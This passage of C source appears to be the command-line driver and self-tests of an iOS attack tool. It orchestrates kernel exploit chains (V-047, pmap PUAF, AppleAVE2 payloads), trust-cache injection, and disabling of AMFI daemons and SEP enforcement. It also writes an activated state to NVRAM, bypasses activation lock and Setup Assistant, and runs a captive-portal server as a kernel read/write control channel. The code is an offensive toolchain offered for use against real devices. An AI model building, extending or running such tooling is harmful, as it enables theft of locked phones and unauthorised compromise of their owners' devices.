        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb
    };
    bool ct_ok = (coretrust_trust_cache_injection(&mock_rw, test_hash, sizeof(test_hash)) == 0);

    if (kslide_ok && tc_ok && allproc_ok && null_guard_ok && inactive_ok && disarm_ok && ct_ok) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Test 16: Stage-6 Synchronous KRW HTTP C2 Bridge & Dynamic Discovery */
    total++;
    printf("Test 16: Stage-6 Synchronous KRW HTTP C2 Bridge & Dynamic Discovery... ");

    /* 1. Zero Fake Success Policy: Unbridged operations must return -1 */
    uint64_t dummy_out = 0;
    bool initial_refuse = (captive_krw_read64(0x1000, &dummy_out) == -1 &&
                           captive_krw_write64(0x1000, 0x1234) == -1);

    /* 2. Initialize bridge */
    captive_krw_init_bridge();
    bool bridge_active_ok = captive_krw_is_bridge_active();

    /* 3. Start test captive server on port 19080 */
    captive_config_t test_srv_cfg;
    memset(&test_srv_cfg, 0, sizeof(test_srv_cfg));
    test_srv_cfg.http_port = 19080;
    test_srv_cfg.enable_http = true;
    test_srv_cfg.enable_dns = false;
    test_srv_cfg.enable_tls = false;
    test_srv_cfg.mode = CAPTIVE_MODE_INTERCEPT;
    snprintf(test_srv_cfg.spoof_ip, sizeof(test_srv_cfg.spoof_ip), "127.0.0.1");

    int srv_start = captive_server_start_async(&test_srv_cfg);
    bool srv_ok = (srv_start == 0);

    /* 4. Start simulated client thread */
    test16_client_state_t client_st;
    memset(&client_st, 0, sizeof(client_st));
    client_st.port = 19080;
    client_st.kbase = test_kbase;
    client_st.kslide = test_kslide;

    pthread_t client_tid;
    int th_res = pthread_create(&client_tid, NULL, test16_simulated_client_thread, &client_st);
    bool client_thread_ok = (th_res == 0);

    /* Settle time */
    usleep(20000);

    /* 5. Direct bridged kread / kwrite round-trip */
    uint64_t test_io_addr = test_kbase + 0x5000;
    uint64_t test_io_val = 0x1122334455667788ULL;
    uint64_t test_io_read = 0;
    bool io_roundtrip_ok = (captive_krw_write64(test_io_addr, test_io_val) == 0 &&
                            captive_krw_read64(test_io_addr, &test_io_read) == 0 &&
                            test_io_read == test_io_val);

    /* 6. Bound kernel_rw_primitive_t using captive_krw */
    kernel_rw_primitive_t bridge_rw;
    memset(&bridge_rw, 0, sizeof(bridge_rw));
    bridge_rw.kbase = test_kbase;
    bridge_rw.kslide = test_kslide;
    bridge_rw.active = true;
    bridge_rw.kread64 = test16_bridged_kread64;
    bridge_rw.kwrite64 = test16_bridged_kwrite64;

    /* 7. CoreTrust Trust Cache Injection over bridge */
    bool ct_bridge_ok = (coretrust_trust_cache_injection(&bridge_rw, test_hash, sizeof(test_hash)) == 0);

    /* 8. AMFI Security Daemons Disarm over bridge */
    bool amfi_bridge_ok = (amfi_disarm_security_daemons(&bridge_rw) == 0);

    /* 9. SEP Hardware Mailbox Dynamic Discovery & Disarm over bridge */
    bool sep_bridge_ok = (sep_disable_enforcement(&bridge_rw) == 0);

    /* 10. NVRAM MobileActivation Dynamic Pattern Match & Hactivation over bridge */
    bool nvram_bridge_ok = (nvram_write_activated_state(&bridge_rw) == 0);

    /* 11. Completion notification to client ("op:done") */
    captive_krw_notify_done();
    pthread_join(client_tid, NULL);
    bool done_signaled_ok = client_st.received_done;

    /* 12. Cleanup & Deactivation */
    captive_server_stop();
    captive_krw_deactivate_bridge();
    bool deact_ok = !captive_krw_is_bridge_active();

    if (initial_refuse && bridge_active_ok && srv_ok && client_thread_ok &&
        io_roundtrip_ok && ct_bridge_ok && amfi_bridge_ok && sep_bridge_ok &&
        nvram_bridge_ok && done_signaled_ok && deact_ok) {
        printf(ANSI_COLOR_GREEN "[PASS]" ANSI_COLOR_RESET "\n");
        passed++;
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET " (refuse=%d, act=%d, srv=%d, th=%d, io=%d, ct=%d, amfi=%d, sep=%d, nvr=%d, done=%d, deact=%d)\n",
               initial_refuse, bridge_active_ok, srv_ok, client_thread_ok,
               io_roundtrip_ok, ct_bridge_ok, amfi_bridge_ok, sep_bridge_ok,
               nvram_bridge_ok, done_signaled_ok, deact_ok);
    }

    printf("\nSelf-Test Result: %d/%d tests passed cleanly.\n", passed, total);
    printf(ANSI_COLOR_CYAN "========================================================================" ANSI_COLOR_RESET "\n\n");

    return passed == total ? 0 : 1;
}

static void print_pmap_result(const pmap_device_result_t *r)
{
    if (!r || !r->valid) {
        LOG_WARN("No valid pmap result");
        return;
    }
    printf("\n" ANSI_COLOR_BOLD "pmap-tte-remove Device Result" ANSI_COLOR_RESET "\n");
    printf("  phase:           %s\n", r->phase);
    printf("  puaf_ready:      %s\n", r->puaf_ready ? "YES" : "no");
    printf("  reclaim_ready:   %s\n", r->reclaim_ready ? "YES" : "no");
    printf("  object_corrupt:  %s\n", r->object_corrupt_ready ? "YES (signal)" : "no");
    if (r->reclaim_strategy[0]) printf("  strategy:        %s\n", r->reclaim_strategy);
    printf("  l3_faults:       %d\n", r->l3_faults);
    printf("  iosurface_hits:  %d\n", r->iosurface_hits);
    printf("  spray/retry:     %d / %d\n", r->spray_count, r->retry_attempts);
    printf("  krw_ready:       %s\n", r->krw_ready ? "YES" : "no (expected on A14+/A18)");
    if (r->verdict[0]) printf("  verdict:         %s\n", r->verdict);
    printf("  write_confirmed: %d/%d\n", r->write_confirmed, r->prove_attempts);
    printf("  elapsed_ms:      %llu\n", (unsigned long long)r->elapsed_ms);
    if (r->machine[0]) printf("  machine:         %s\n", r->machine);
    if (r->ios_version[0]) printf("  ios:             %s\n", r->ios_version);
    if (r->error[0]) printf("  error:           %s\n", r->error);
    printf("\n");
}

static pmap_payload_mode_t parse_pmap_mode(const char *mode)
{
    if (!mode || strcmp(mode, "prove") == 0) {
        return PMAP_PAYLOAD_PROVE;
    }
    if (strcmp(mode, "check") == 0) {
        return PMAP_PAYLOAD_CHECK;
    }
    if (strcmp(mode, "reclaim") == 0) {
        return PMAP_PAYLOAD_RECLAIM;
    }
    return PMAP_PAYLOAD_FULL;
}

static v047_payload_mode_t parse_v047_mode(const char *mode)
{
    if (!mode) {
        return V047_PAYLOAD_FULL;
    }
    if (strcmp(mode, "check") == 0) {
        return V047_PAYLOAD_CHECK;
    }
    if (strcmp(mode, "groom") == 0) {
        return V047_PAYLOAD_GROOM;
    }
    if (strcmp(mode, "fire") == 0) {
        return V047_PAYLOAD_FIRE;
    }
    return V047_PAYLOAD_FULL;
}

static void print_v047_result(const v047_device_result_t *r)
{
    if (!r || !r->valid) {
        LOG_WARN("No valid V-047 result");
        return;
    }
    printf("\n" ANSI_COLOR_BOLD "V-047 Device Result" ANSI_COLOR_RESET "\n");
    printf("  phase:        %s\n", r->phase);
    printf("  driver_open:  %s\n", r->driver_open ? "yes" : "no");
    printf("  necp_groom:   %s (%d clients)\n", r->necp_groom_ok ? "ok" : "no", r->necp_clients);
    printf("  v047_kr:      0x%08x\n", r->v047_kr);
    printf("  triggers:     %u\n", r->v047_triggers);
    printf("  copy_length:  0x%x\n", r->copy_length);
    printf("  krw_ready:    %s\n", r->krw_ready ? "YES" : "no");
    if (r->machine[0]) {
        printf("  machine:      %s\n", r->machine);
    }
    if (r->error[0]) {
        printf("  error:        %s\n", r->error);
    }
    printf("\n");
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        print_help(argv[0]);
        return 0;
    }

    int opt_detect = 0;
    int opt_port_dfu = 0;
    int opt_usb_scan = 0;
    int opt_probe_services = 0;
    int opt_inject_flags = 0;
    int opt_verify_flags = 0;
    int opt_reboot = 0;
    int opt_syslog = 0;
    int opt_probe_albert = 0;
    int opt_activate_online = 0;
    int opt_activate_offline = 0;
    int opt_activate_race = 0;
    int opt_deactivate = 0;
    int opt_crash_preboard = 0;
    int opt_triage_crash = 0;
    int opt_exploit_preboard = 0;
    int opt_stage_bypass = 0;
    int opt_dismiss_setup = 0;
    int opt_bypass_full = 0;
    int opt_bypass_watch = 0;
    int opt_captive = 0;
    int opt_setup_assistant_chain = 0;
    int opt_test = 0;
    int opt_sovereign = 0;
    int opt_sovereign_lite = 0;
    int opt_neo_chain = 0;
    int opt_test_kernel_exploit = 0;
    int opt_test_amfi_bypass = 0;
    int opt_build_v047_payload = 0;
    int opt_pull_v047_result = 0;
    int opt_pmap_chain = 0;
    int opt_build_pmap_payload = 0;
    int opt_pull_pmap_result = 0;
    int opt_build_appleave2_payload = 0;
    int opt_appleave2_deploy = 0;
    int opt_pull_appleave2_result = 0;
    int opt_test_lockdown_bypass = 0;
    int opt_verbose = 0;

    const char *v047_ondevice_mode = NULL;
    const char *pmap_ondevice_mode = NULL;

    const char *afc_ls_path = NULL;
    const char *afc_pull_remote = NULL;
    const char *afc_pull_local = NULL;
    const char *afc_push_local = NULL;
    const char *afc_push_remote = NULL;
    int syslog_seconds = 10;

    captive_config_t cap_cfg;
    memset(&cap_cfg, 0, sizeof(cap_cfg));
    cap_cfg.http_port = 8080;
    cap_cfg.dns_port = 5353;
    cap_cfg.tls_port = 8443;
    cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
    cap_cfg.enable_http = true;
    cap_cfg.enable_dns = true;
    cap_cfg.enable_tls = true;
    int cap_ports_customized = 0;

    const char *export_profile_path = NULL;

    enum {
        OPT_PORT_DFU = 1000,
        OPT_USB_SCAN,
        OPT_PROBE_SERVICES,
        OPT_AFC_LS,
        OPT_AFC_PULL,
        OPT_AFC_PUSH,
        OPT_INJECT_FLAGS,
        OPT_VERIFY_FLAGS,
        OPT_REBOOT,
        OPT_SYSLOG,
        OPT_PROBE_ALBERT,
        OPT_ACTIVATE_ONLINE,
        OPT_ACTIVATE_OFFLINE,
        OPT_ACTIVATE_RACE,
        OPT_DEACTIVATE,
        OPT_CRASH_PREBOARD,
        OPT_TRIAGE_CRASH,
        OPT_EXPLOIT_PREBOARD,
        OPT_STAGE_BYPASS,
        OPT_DISMISS_SETUP,
        OPT_BYPASS_FULL,
        OPT_BYPASS_WATCH,
        OPT_CAPTIVE,
        OPT_CAPTIVE_DNS_PORT,
        OPT_CAPTIVE_TLS_PORT,
        OPT_CAPTIVE_IP,
        OPT_CAPTIVE_MODE,
        OPT_EXPORT_PROFILE,
        OPT_TEST,
        OPT_SOVEREIGN,
        OPT_SOVEREIGN_LITE,
        OPT_NEO_CHAIN,
        OPT_TEST_KERNEL_EXPLOIT,
        OPT_TEST_AMFI_BYPASS,
        OPT_BUILD_V047_PAYLOAD,
        OPT_V047_ONDEVICE,
        OPT_PULL_V047_RESULT,
        OPT_PMAP_CHAIN,
        OPT_BUILD_PMAP_PAYLOAD,
        OPT_PMAP_ONDEVICE,
        OPT_PULL_PMAP_RESULT,
        OPT_SETUP_ASSISTANT_CHAIN,
        OPT_BUILD_APPLEAVE2_PAYLOAD,
        OPT_APPLEAVE2_DEPLOY,
        OPT_APPLEAVE2_STATUS,
        OPT_PULL_APPLEAVE2_RESULT,
        OPT_TEST_LOCKDOWN_BYPASS
    };

    static struct option long_options[] = {
        { "detect",           no_argument,       NULL, 'd' },
        { "port-dfu",         no_argument,       NULL, OPT_PORT_DFU },
        { "usb-scan",         no_argument,       NULL, OPT_USB_SCAN },
        { "probe-services",   no_argument,       NULL, OPT_PROBE_SERVICES },
        { "afc-ls",           required_argument, NULL, OPT_AFC_LS },
        { "afc-pull",         required_argument, NULL, OPT_AFC_PULL },
        { "afc-push",         required_argument, NULL, OPT_AFC_PUSH },
        { "inject-flags",     no_argument,       NULL, OPT_INJECT_FLAGS },
        { "verify-flags",     no_argument,       NULL, OPT_VERIFY_FLAGS },
        { "reboot",           no_argument,       NULL, OPT_REBOOT },
        { "syslog",           optional_argument, NULL, OPT_SYSLOG },
        { "probe-albert",     no_argument,       NULL, OPT_PROBE_ALBERT },
        { "activate-online",  no_argument,       NULL, OPT_ACTIVATE_ONLINE },
        { "activate-offline", no_argument,       NULL, OPT_ACTIVATE_OFFLINE },
        { "activate-race",    no_argument,       NULL, OPT_ACTIVATE_RACE },
        { "deactivate",       no_argument,       NULL, OPT_DEACTIVATE },
        { "crash-preboard",   no_argument,       NULL, OPT_CRASH_PREBOARD },
        { "triage-crash",     no_argument,       NULL, OPT_TRIAGE_CRASH },
        { "exploit-preboard", no_argument,       NULL, OPT_EXPLOIT_PREBOARD },
        { "stage-bypass",     no_argument,       NULL, OPT_STAGE_BYPASS },
        { "dismiss-setup",    no_argument,       NULL, OPT_DISMISS_SETUP },
        { "bypass-full",      no_argument,       NULL, OPT_BYPASS_FULL },
        { "bypass-watch",     no_argument,       NULL, OPT_BYPASS_WATCH },
        { "captive-server",   optional_argument, NULL, OPT_CAPTIVE },
        { "captive-dns-port", required_argument, NULL, OPT_CAPTIVE_DNS_PORT },
        { "captive-tls-port", required_argument, NULL, OPT_CAPTIVE_TLS_PORT },
        { "captive-ip",       required_argument, NULL, OPT_CAPTIVE_IP },
        { "captive-mode",     required_argument, NULL, OPT_CAPTIVE_MODE },
        { "export-profile",   required_argument, NULL, OPT_EXPORT_PROFILE },
        { "test",             no_argument,       NULL, OPT_TEST },
        { "sovereign",           no_argument,       NULL, OPT_SOVEREIGN },
        { "sovereign-lite",      no_argument,       NULL, OPT_SOVEREIGN_LITE },
        { "neo-chain",           no_argument,       NULL, OPT_NEO_CHAIN },
        { "test-kernel-exploit", no_argument,       NULL, OPT_TEST_KERNEL_EXPLOIT },
        { "test-amfi-bypass",    no_argument,       NULL, OPT_TEST_AMFI_BYPASS },
        { "build-v047-payload",  no_argument,       NULL, OPT_BUILD_V047_PAYLOAD },
        { "v047-ondevice",       required_argument, NULL, OPT_V047_ONDEVICE },
        { "pull-v047-result",    no_argument,       NULL, OPT_PULL_V047_RESULT },
        { "pmap-chain",          no_argument,       NULL, OPT_PMAP_CHAIN },
        { "build-pmap-payload",  no_argument,       NULL, OPT_BUILD_PMAP_PAYLOAD },
        { "pmap-ondevice",       required_argument, NULL, OPT_PMAP_ONDEVICE },
        { "pull-pmap-result",    no_argument,       NULL, OPT_PULL_PMAP_RESULT },
        { "setup-assistant-chain", no_argument,     NULL, OPT_SETUP_ASSISTANT_CHAIN },
        { "build-appleave2-payload", no_argument,   NULL, OPT_BUILD_APPLEAVE2_PAYLOAD },
        { "appleave2-deploy",      no_argument,     NULL, OPT_APPLEAVE2_DEPLOY },
        { "appleave2-status",      no_argument,     NULL, OPT_APPLEAVE2_STATUS },
        { "pull-appleave2-result", no_argument,     NULL, OPT_PULL_APPLEAVE2_RESULT },
        { "test-lockdown-bypass",  no_argument,     NULL, OPT_TEST_LOCKDOWN_BYPASS },
        { "verbose",          no_argument,       NULL, 'v' },
        { "help",             no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "dvh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'd': opt_detect = 1; break;
            case 'v': opt_verbose = 1; break;
            case 'h': print_help(argv[0]); return 0;
            case OPT_PORT_DFU: opt_port_dfu = 1; break;
            case OPT_USB_SCAN: opt_usb_scan = 1; break;
            case OPT_PROBE_SERVICES: opt_probe_services = 1; break;
            case OPT_AFC_LS: afc_ls_path = optarg; break;
            case OPT_AFC_PULL:
                afc_pull_remote = optarg;
                if (optind < argc) afc_pull_local = argv[optind++];
                break;
            case OPT_AFC_PUSH:
                afc_push_local = optarg;
                if (optind < argc) afc_push_remote = argv[optind++];
                break;
            case OPT_INJECT_FLAGS: opt_inject_flags = 1; break;
            case OPT_VERIFY_FLAGS: opt_verify_flags = 1; break;
            case OPT_REBOOT: opt_reboot = 1; break;
            case OPT_SYSLOG:
                opt_syslog = 1;
                if (optarg) syslog_seconds = atoi(optarg);
                break;
            case OPT_PROBE_ALBERT: opt_probe_albert = 1; break;
            case OPT_ACTIVATE_ONLINE: opt_activate_online = 1; break;
            case OPT_ACTIVATE_OFFLINE: opt_activate_offline = 1; break;
            case OPT_ACTIVATE_RACE: opt_activate_race = 1; break;
            case OPT_DEACTIVATE: opt_deactivate = 1; break;
            case OPT_CRASH_PREBOARD: opt_crash_preboard = 1; break;
            case OPT_TRIAGE_CRASH: opt_triage_crash = 1; break;
            case OPT_EXPLOIT_PREBOARD: opt_exploit_preboard = 1; break;
            case OPT_STAGE_BYPASS: opt_stage_bypass = 1; break;
            case OPT_DISMISS_SETUP: opt_dismiss_setup = 1; break;
            case OPT_BYPASS_FULL: opt_bypass_full = 1; break;
            case OPT_BYPASS_WATCH: opt_bypass_watch = 1; break;
            case OPT_CAPTIVE:
                opt_captive = 1;
                if (optarg) {
                    cap_cfg.http_port = (uint16_t)atoi(optarg);
                    cap_ports_customized = 1;
                } else if (optind < argc && argv[optind][0] != '-') {
                    cap_cfg.http_port = (uint16_t)atoi(argv[optind++]);
                    cap_ports_customized = 1;
                }
                break;
            case OPT_CAPTIVE_DNS_PORT:
                cap_cfg.dns_port = (uint16_t)atoi(optarg);
                cap_ports_customized = 1;
                break;
            case OPT_CAPTIVE_TLS_PORT:
                cap_cfg.tls_port = (uint16_t)atoi(optarg);
                cap_ports_customized = 1;
                break;
            case OPT_CAPTIVE_IP:
                snprintf(cap_cfg.spoof_ip, sizeof(cap_cfg.spoof_ip), "%s", optarg);
                break;
            case OPT_CAPTIVE_MODE:
                if (strcasecmp(optarg, "success") == 0) {
                    cap_cfg.mode = CAPTIVE_MODE_SUCCESS;
                } else if (strcasecmp(optarg, "redirect") == 0) {
                    cap_cfg.mode = CAPTIVE_MODE_REDIRECT;
                } else {
                    cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
                }
                break;
            case OPT_EXPORT_PROFILE:
                export_profile_path = optarg;
                break;
            case OPT_TEST: opt_test = 1; break;
            case OPT_SOVEREIGN: opt_sovereign = 1; break;
            case OPT_SOVEREIGN_LITE: opt_sovereign_lite = 1; break;
            case OPT_NEO_CHAIN: opt_neo_chain = 1; break;
            case OPT_TEST_KERNEL_EXPLOIT: opt_test_kernel_exploit = 1; break;
            case OPT_TEST_AMFI_BYPASS: opt_test_amfi_bypass = 1; break;
            case OPT_BUILD_V047_PAYLOAD: opt_build_v047_payload = 1; break;
            case OPT_V047_ONDEVICE: v047_ondevice_mode = optarg; break;
            case OPT_PULL_V047_RESULT: opt_pull_v047_result = 1; break;
            case OPT_PMAP_CHAIN: opt_pmap_chain = 1; break;
            case OPT_BUILD_PMAP_PAYLOAD: opt_build_pmap_payload = 1; break;
            case OPT_PMAP_ONDEVICE: pmap_ondevice_mode = optarg; break;
            case OPT_PULL_PMAP_RESULT: opt_pull_pmap_result = 1; break;
            case OPT_SETUP_ASSISTANT_CHAIN: opt_setup_assistant_chain = 1; break;
            case OPT_BUILD_APPLEAVE2_PAYLOAD: opt_build_appleave2_payload = 1; break;
            case OPT_APPLEAVE2_DEPLOY: opt_appleave2_deploy = 1; break;
            case OPT_APPLEAVE2_STATUS:
            case OPT_PULL_APPLEAVE2_RESULT: opt_pull_appleave2_result = 1; break;
            case OPT_TEST_LOCKDOWN_BYPASS: opt_test_lockdown_bypass = 1; break;
            default:
                print_help(argv[0]);
                return 1;
        }
    }

    log_init(opt_verbose);

    if (opt_build_v047_payload) {
        return device_payload_build_v047(true) == 0 ? 0 : 1;
    }

    if (opt_build_pmap_payload) {
        return pmap_device_payload_build(true) == 0 ? 0 : 1;
    }

    if (opt_build_appleave2_payload) {
        return appleave2_payload_build() == 0 ? 0 : 1;
    }

    if (opt_test) {
        return run_unit_tests();
    }

    if (export_profile_path) {
        char host_ip[64] = {0};
        captive_server_get_host_ip(host_ip, sizeof(host_ip));
        if (captive_payload_export_profile(export_profile_path, host_ip, cap_cfg.http_port) == 0) {
            LOG_SUCCESS("Exported research configuration profile to: %s", export_profile_path);
            return 0;
        } else {
            LOG_ERROR("Failed to write configuration profile to: %s", export_profile_path);
            return 1;
        }
    }

    if (opt_setup_assistant_chain) {
        /* Prefer privileged CNA ports when root and operator did not override. */
        if (!cap_ports_customized && geteuid() == 0) {
            cap_cfg.http_port = 80;
            cap_cfg.dns_port = 53;
            cap_cfg.tls_port = 443;
        }
        cap_cfg.mode = CAPTIVE_MODE_INTERCEPT;
        return setup_assistant_chain_run(&cap_cfg, NULL);
    }

    if (opt_captive) {
        return captive_server_start_custom(&cap_cfg);
    }

    if (opt_bypass_watch) {
        return bypass_chain_watch_mode();
    }

    libusb_context *usb_ctx = NULL;
    usb_ctrl_init(&usb_ctx);

    if (opt_usb_scan) {
        target_print_banner();
        LOG_INFO("Scanning USB subsystem for Apple hardware...");
        usb_ctrl_probe_apple_devices(usb_ctx);
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    if (opt_port_dfu) {
        target_print_banner();
        LOG_INFO("Searching for device in Port DFU Mode (0x05AC:0xF014)...");
        port_dfu_info_t dfu;
        if (port_dfu_detect(usb_ctx, &dfu) == 0) {
            port_dfu_print_info(&dfu);
        } else {
            LOG_WARN("No device currently detected in Port DFU Mode.");
        }
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    /* Standard Lockdown Connection Routine */
    l0fck_session_t sess;
    session_init(&sess);

    int ld_status = session_connect(&sess);

    if (opt_detect) {
        target_print_banner();
        if (ld_status == 0) {
            target_print_device_diagnostics(&sess.info);
        } else {
            LOG_INFO("Normal lockdown connection unavailable. Checking Port DFU / Recovery states...");
            port_dfu_info_t dfu;
            if (port_dfu_detect(usb_ctx, &dfu) == 0) {
                port_dfu_print_info(&dfu);
            } else {
                LOG_ERROR("No Apple device discovered over USB. Ensure device is connected.");
            }
        }
        session_disconnect(&sess);
        usb_ctrl_exit(usb_ctx);
        return 0;
    }

    if (ld_status != 0) {
        LOG_ERROR("Could not establish unauthenticated lockdown connection with device.");
        LOG_INFO("If device is in Port DFU mode, use --port-dfu instead.");
        usb_ctrl_exit(usb_ctx);
        return 1;
    }

    int ret = 0;

    if (opt_test_kernel_exploit) {
        ret = neo_chain_test_kernel_exploit(&sess);
    } else if (opt_test_amfi_bypass) {
        ret = neo_chain_test_amfi_bypass(&sess);
    } else if (opt_pull_v047_result) {
        v047_device_result_t v047_result;
        memset(&v047_result, 0, sizeof(v047_result));
        if (device_payload_fetch_v047_result(&sess, &v047_result) == 0) {
            print_v047_result(&v047_result);
            ret = v047_result.driver_open ? 0 : 1;
        } else {
            LOG_ERROR("No V-047 result at %s — run payload on device first", L0FCK_AFC_RESULT_PATH);
            device_payload_print_run_instructions("full");
            ret = 1;
        }
    } else if (v047_ondevice_mode) {
        v047_payload_mode_t mode = parse_v047_mode(v047_ondevice_mode);
        kernel_exploit_set_device_session(&sess);
        ret = device_payload_run_v047(&sess, mode, 0x1004, 60);
        if (ret == 0) {
            v047_device_result_t v047_result;
            memset(&v047_result, 0, sizeof(v047_result));
            if (device_payload_fetch_v047_result(&sess, &v047_result) == 0) {
                print_v047_result(&v047_result);
            }
        }
    } else if (pmap_ondevice_mode) {
        pmap_payload_mode_t mode = parse_pmap_mode(pmap_ondevice_mode);
        kernel_exploit_set_device_session(&sess);
        ret = pmap_device_payload_run(&sess, mode, 120);
        if (ret == 0 || ret == -1) {
            pmap_device_result_t pmap_result;
            memset(&pmap_result, 0, sizeof(pmap_result));
            if (pmap_device_payload_fetch_result(&sess, &pmap_result) == 0) {
                print_pmap_result(&pmap_result);
                ret = pmap_result.puaf_ready ? 0 : 1;
            }
        }
    } else if (opt_pull_pmap_result) {
        pmap_device_result_t pmap_result;
        memset(&pmap_result, 0, sizeof(pmap_result));
        if (pmap_device_payload_fetch_result(&sess, &pmap_result) == 0) {
            print_pmap_result(&pmap_result);
            ret = pmap_result.puaf_ready ? 0 : 1;
        } else {
            LOG_ERROR("No pmap result at %s", L0FCK_AFC_PMAP_RESULT_PATH);
            pmap_device_payload_print_instructions("prove");
            ret = 1;
        }
    } else if (opt_probe_services) {
        services_audit_unauthenticated(sess.dev, sess.ld, opt_verbose);
    } else if (afc_ls_path) {
        ret = afc_manager_list_dir(sess.dev, sess.ld, afc_ls_path);
    } else if (afc_pull_remote && afc_pull_local) {
        ret = afc_manager_pull_file(sess.dev, sess.ld, afc_pull_remote, afc_pull_local);
    } else if (afc_push_local && afc_push_remote) {
        ret = afc_manager_push_file(sess.dev, sess.ld, afc_push_local, afc_push_remote);
    } else if (opt_inject_flags) {
        ret = flag_injector_inject_all_session(&sess);
    } else if (opt_verify_flags) {
        ret = flag_injector_verify(sess.ld);
    } else if (opt_reboot) {
        ret = services_reboot_device(sess.dev, sess.ld);
    } else if (opt_syslog) {
        ret = services_stream_syslog(sess.dev, sess.ld, syslog_seconds);
    } else if (opt_probe_albert) {
        ret = albert_probe_full(sess.dev, sess.ld);
    } else if (opt_activate_online) {
        ret = albert_perform_online_activation(sess.dev, sess.ld);
    } else if (opt_activate_offline) {
        ret = albert_perform_offline_activation(sess.dev, sess.ld);
    } else if (opt_activate_race) {
        ret = albert_perform_race_activation(&sess, NULL);
    } else if (opt_deactivate) {
        ret = mobileact_deactivate(sess.dev, sess.ld);
    } else if (opt_crash_preboard) {
        ret = preboard_poc_run_session(&sess);
    } else if (opt_triage_crash) {
        ret = preboard_triage_run_live_session(&sess, NULL);
    } else if (opt_exploit_preboard) {
        ret = preboard_exploit_execute_session(&sess, EXPLOIT_MODE_AUTO);
    } else if (opt_stage_bypass) {
        ret = springboard_stage_preferences(&sess);
        flag_injector_inject_all_session(&sess);
    } else if (opt_dismiss_setup) {
        ret = springboard_dispatch_notifications(&sess);
    } else if (opt_sovereign) {
        ret = sovereign_chain_run(&sess);
    } else if (opt_sovereign_lite) {
        ret = sovereign_lite_run(&sess);
    } else if (opt_bypass_full) {
        ret = bypass_chain_run_full(&sess, NULL);
    } else if (opt_neo_chain) {
        ret = neo_chain_run(&sess, NULL);
    } else if (opt_pmap_chain) {
        ret = pmap_chain_run(&sess, NULL);
    } else if (opt_test_lockdown_bypass) {
        ret = lockdown_bypass_test(sess.ld);
    } else if (opt_appleave2_deploy) {
        ret = appleave2_payload_deploy(&sess);
    } else if (opt_pull_appleave2_result) {
        appleave2_device_result_t ave_result;
        memset(&ave_result, 0, sizeof(ave_result));
        if (appleave2_payload_fetch_result(&sess, &ave_result) == 0) {
            appleave2_payload_print_result(&ave_result);
            ret = ave_result.krw_ready ? 0 : 1;
        } else {
            LOG_ERROR("No AppleAVE2 result found at %s", L0FCK_AFC_AVE2_RESULT_PATH);
            appleave2_payload_print_instructions("race");
            ret = 1;
        }
    }

    session_disconnect(&sess);
    usb_ctrl_exit(usb_ctx);
    return ret;
}
